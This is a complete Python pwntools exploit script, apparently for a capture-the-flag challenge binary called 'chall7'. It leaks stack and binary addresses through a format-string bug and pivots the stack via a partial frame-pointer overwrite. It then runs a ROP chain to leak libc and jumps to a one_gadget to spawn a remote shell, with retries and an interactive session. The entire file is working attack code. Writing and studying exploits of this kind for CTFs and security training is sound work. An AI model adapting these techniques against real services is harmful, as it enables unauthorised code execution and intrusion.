#!/usr/bin/env python2
from pwn import *
import sys

HOST = ''
PORT = 40007

NUM_ATTEMPTS = 40

target_elf = ELF('../bin/chall7')
#target_elf = ELF('chall7-old')
rop = ROP(target_elf)

def get_one_gadgets(libc):
    args = ["one_gadget", "-r"]
    if len(libc) == 40 and all(x in string.hexdigits for x in libc.hex()):
        args += ["-b", libc.hex()]
    else:
        args += [libc]
    return [int(offset) for offset in subprocess.check_output(args).decode('ascii').strip().split()]

# context(terminal=['tmux', 'splitw', '-h'])  # horizontal split window
# context(terminal=['tmux', 'new-window'])    # open new window

def get_strncmp_avx2(elf):
    """Start from strncmp(), find the first address loaded into rdx which _should_ be __strncmp_avx2()"""
    strncmp_offset = elf.symbols['strncmp']
    for line in elf.disasm(strncmp_offset, 200).split('\n'):
        line = ' '.join(line.split())
        if 'lea rax' in line:
            return int(line.split(' # ', 1)[1], 16)
    return False


DEBUG = False
if len(sys.argv) > 1:
    HOST  = sys.argv[1]

if len(sys.argv) > 2:
    PORT = sys.argv[2]

def exploit_attempt():
    try:
        if len(HOST) > 0:
            io = remote(HOST, PORT)
            target_libc = ELF('../bin/libc.so.6')
        else:
            io = target_elf.process(level='warn')
            target_libc = target_elf.libc

        STACK     = 0x28                              # distance from stack leak to trampoline buffer
        BASE      = target_elf.symbols['play'] + 0x74 # distance from binary leak to binary base
        LIBC      = get_strncmp_avx2(target_libc)     # distance from strncmp@GOT to libc base
        MAGIC     = random.choice(get_one_gadgets(target_libc.path)) # one shot magic gadget

        PIVOT_BUF = target_elf.symbols['data'] + 0x1F8
        POP_RBP   = rop.find_gadget(['pop rbp']).address
        LEAVE_RET = rop.find_gadget(['leave', 'ret']).address 

        if DEBUG:
            gdb.attach(io.pid, 'brva 0xafa\nbrva 0xc6d\nbrva 0xa4a')
            pause()

        # step 1: use fsb to get some leaks
        io.recvuntil(b': ')
        io.sendline(b'%11$p.%13$p')
        io.recvuntil(b': ')
        leaks = io.recvline().strip().decode('ascii').split('.')

        io.recvuntil(b': ')
        io.sendline(b'yes sir')

        stack = int(leaks[0], 16) - STACK
        base  = int(leaks[1], 16) - BASE

        log.info('Stack: %#018x' % stack)
        log.info('Base:  %#018x' % base)

        # step 2: use fsb to alter two lowest bytes of future rbp to pivot to trampoline
        io.recvuntil(b': ')
        payload = '%'+str(stack & 0xffff)+'c%12$hn'
        io.send(payload.encode('ascii'))
        io.recvuntil(b': ')
        io.recvuntil(b': ')
        io.sendline(b'yes sir')

        # step 3: plant rop to leak libc and read another payload over this one
        pay1  = b'\x00'*512
        log.info('Gadget1: %#x', base + rop.find_gadget(['pop rdi', 'ret']).address)
        pay1 += p64(base + rop.find_gadget(['pop rdi', 'ret']).address) # 0x000cd3  # pop rdi ; ret
        pay1 += p64(base + target_elf.symbols['got.strncmp'] )  # GOT 0x201f90
        pay1 += p64(base + target_elf.symbols['puts'])  # puts() (0x000760)
        pay1 += p64(base + target_elf.symbols['input'] + 0x63)  # 0x000a4a read(stdin, data, 0x400) ; ret
        pay1 += cyclic(1024 - len(pay1))

        io.recvuntil(b': ')
        io.send(pay1)

        # step 4: trigger trampoline bounce to ropchain
        io.recvuntil(b'nope): ')
        io.send(p64(base + POP_RBP) + p64(base + PIVOT_BUF) + p64(base + LEAVE_RET))

        # step 5: read leak
        leak = io.recvline().strip()
        leak = u64(leak + b'\x00\x00')
        libc = leak - LIBC

        log.info('Leak:  %#018x' % leak)
        log.info('Libc:  %#018x' % libc)

        # step 6: write second payload
        pay2  = b'\x00'*512
        pay2 += p64(base + rop.find_gadget(['ret']).address) * 8 # ret 0x00073e
        pay2 += p64(libc + MAGIC)        # execve(/bin/sh, NULL, environ)
        pay2 += b'\x00'*(1024 - len(pay2))

        io.send(pay2)

        # step 6: collect shell
        io.sendline(b'id')
        id_result = io.recvline()
        if b'uid=' in id_result:
            log.success('shell: %s', id_result.decode('ascii').strip())
            if not os.environ.get('HEALTH_CHECK', False):
                io.interactive()
            return True
        else:
            log.failure('Error: %s', id_result)
    except EOFError as e:
        log.failure('Fail: EOF')
    except Exception as e:
        log.failure('Error: %s: %s', type(e), str(e))
    finally:
        io.close()
    return False

if __name__ == '__main__':
    for _ in range(NUM_ATTEMPTS):
        if exploit_attempt():
            sys.exit(0)
        sleep(0.1)
    sys.exit(1)
